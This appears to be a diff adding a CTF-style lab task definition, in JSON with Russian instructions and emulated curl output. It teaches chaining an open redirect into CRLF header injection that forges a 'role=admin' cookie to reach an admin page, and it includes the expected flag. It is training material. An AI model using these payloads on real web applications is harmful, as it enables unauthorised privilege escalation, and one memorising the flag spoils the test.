@@ -1,0 +1,44 @@
+{
+  "id": "web-open-redirect-crlf",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{crlf_h34d3r_1nj3ct10n_ftw}"
+  },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: Open Redirect → CRLF → захват\n\n`app.example` после логина редиректит на параметр `next`, подставляя его в\nзаголовок `Location`. Из открытого редиректа сделаем инъекцию заголовка и\nвыставим себе админскую cookie.\n\n1. Штатный редирект:\n   curl -s -i 'http://app.example/redirect?next=/home'\n2. Открытый редирект:\n   curl -s -i 'http://app.example/redirect?next=https://evil.test'\n3. CRLF-инъекция: вставь `%0d%0a`, чтобы добавить свой заголовок в ответ:\n   curl -s -i 'http://app.example/redirect?next=%0d%0aSet-Cookie:%20role=admin'\n4. Сервер выставил cookie `role=admin`. Возьми ей админку:\n   curl -s 'http://app.example/admin' -H 'Cookie: role=admin'\n5. Флаг — последняя строка. Запиши в `found.txt` и набери `check`.\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция app.example)",
+      "cases": [
+        {
+          "match": "app\\.example/admin",
+          "example": "-s 'http://app.example/admin' -H 'Cookie: role=admin'",
+          "output": "admin panel\nnto{crlf_h34d3r_1nj3ct10n_ftw}\n"
+        },
+        {
+          "match": "%0d%0a",
+          "example": "-s -i 'http://app.example/redirect?next=%0d%0aSet-Cookie:%20role=admin'",
+          "output": "HTTP/1.1 302 Found\nLocation: /\nSet-Cookie: role=admin\nContent-Length: 0\n\n"
+        },
+        {
+          "match": "next=https",
+          "example": "-s -i 'http://app.example/redirect?next=https://evil.test'",
+          "output": "HTTP/1.1 302 Found\nLocation: https://evil.test\nContent-Length: 0\n\n"
+        },
+        {
+          "match": "next=",
+          "example": "-s -i 'http://app.example/redirect?next=/home'",
+          "output": "HTTP/1.1 302 Found\nLocation: /home\nContent-Length: 0\n\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируются только /redirect и /admin на app.example.\n"
+    }
+  }
+}
